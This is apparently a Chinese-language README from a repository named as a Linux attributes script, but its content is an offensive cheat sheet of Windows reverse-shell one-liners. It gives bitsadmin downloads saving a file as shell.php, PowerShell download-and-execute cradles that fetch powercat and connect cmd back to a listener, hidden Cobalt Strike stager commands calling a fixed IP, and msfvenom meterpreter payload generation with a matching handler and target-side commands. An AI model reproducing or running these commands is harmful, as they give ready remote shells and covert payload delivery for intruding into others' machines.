# CheckLinux
linux的基本属性脚本
———————————————————————————————————————————————————————————————
# bitsadmin

bitsadmin  可以用来在windows 命令行下下载文件。bitsadmin是windows 后台智能传输服务的一个工具，windows 的自动更新，补丁之类的下载就是用这个工具来实现的。Windows Server2003和XP是没有bitsadmin的，Winc7及其之后的机器才有。

bitsadmin的一些特性：
bitsadmin 可以在网络不稳定的状态下下载文件，出错会自动重试，可靠性应该相当不错。
bitsadmin 可以跟随URL跳转.
bitsadmin 不像curl  wget 这类工具那样能用来下载HTML页面。
bitsadmin /transfer test http://files.cnblogs.com/files/gayhub/bcn.js  c:\users\xie\desktop\shell.php
#"任务名" 可以随意起，保存文件的文件路径必须是已经存在的目录，否则不能下载。
bitsadmin /setpriority test foreground     #设置任务test为最高优先级

# cmd窗口下利用Powershell反弹NC shell 
亲测所有机器都适用
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/main/powercat.ps1');powercat -c 192.168.10.11 -p 8888 -e cmd
powershell -nop -exec bypass -c "IEX (New-Object System.Net.Webclient)DownloadString('https://raw.githubusercontent.com/zyh2580/CheckLinux/main/powercat.ps1');powercat -c 192.168.10.11  -p 8888 -e cmd.exe"
# cmd窗口下利用Powershell反弹CobaltStrike shell
windows10 经常性不能用。windows 2008R2以下百分百适用。
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://114.118.80.138:8080/a'))"   #后台运行
powershell.exe  -c "IEX ((new-object net.webclient).downloadstring('http://114.118.80.138:8080/a'))"  
# cmd窗口下反弹MSF shell

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=114.128.90.138 lport=7788 -f psh-reflection >7788.ps1        #生成木马文件 7788.ps1
python -m SimpleHTTPServer 80  #开启web服务
# MSF监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 114.118.80.138
set lport 7788
exploit -j
# 目标机的操作

powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://114.118.80.138/7788.ps1');xx.ps1"  #后台运行
或者
powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://114.118.80.138/7788.ps1');xx.ps'
